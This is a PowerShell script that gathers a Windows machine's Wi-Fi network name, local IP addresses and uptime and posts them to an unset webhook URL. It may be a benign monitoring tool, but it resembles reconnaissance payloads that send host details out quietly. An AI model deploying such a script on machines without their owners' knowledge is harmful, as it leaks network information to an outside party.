$webhookUrl = ""
Function Get-WifiNetworkName {
    $wifiInterface = Get-NetAdapter | Where-Object { $_.Name -like "Wi-Fi" }
    if ($wifiInterface) {
        $wifiNetwork = (Get-NetConnectionProfile -InterfaceIndex $wifiInterface.IfIndex).Name
        return $wifiNetwork
    } else {
        return "Not connected to Wi-Fi"
    }
}
Function Get-LocalIpAddresses {
    $localIpAddresses = @()
    
    $wifiInterface = Get-NetAdapter | Where-Object { $_.Name -like "Wi-Fi" }
    if ($wifiInterface) {
        $wifiIpAddress = (Get-NetIPAddress -InterfaceIndex $wifiInterface.IfIndex -AddressFamily IPv4).IPAddress
        $localIpAddresses += "Wi-Fi IP Address: $wifiIpAddress"
    }

    $ethernetInterface = Get-NetAdapter | Where-Object { $_.Name -like "Ethernet" }
    if ($ethernetInterface) {
        $ethernetIpAddress = (Get-NetIPAddress -InterfaceIndex $ethernetInterface.IfIndex -AddressFamily IPv4).IPAddress
        $localIpAddresses += "Ethernet IP Address: $ethernetIpAddress"
    }

    return $localIpAddresses -join "`n"
}
Function Get-SystemUptime {
    $uptime = (Get-Date) - (gcim Win32_OperatingSystem).LastBootUpTime
    $uptimeFormatted = "{0} days, {1} hours, {2} minutes" -f $uptime.Days, $uptime.Hours, $uptime.Minutes
    return $uptimeFormatted
}
$wifiNetworkName = Get-WifiNetworkName
$localIpAddresses = Get-LocalIpAddresses
$uptime = Get-SystemUptime
$messageContent = @"
**Connected Wi-Fi Network**: $wifiNetworkName
**Local IP Addresses**:
$localIpAddresses
**System Uptime**: $uptime
"@
$payload = @{
    content = $messageContent
}
$jsonPayload = $payload | ConvertTo-Json
Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "application/json" -Body $jsonPayload
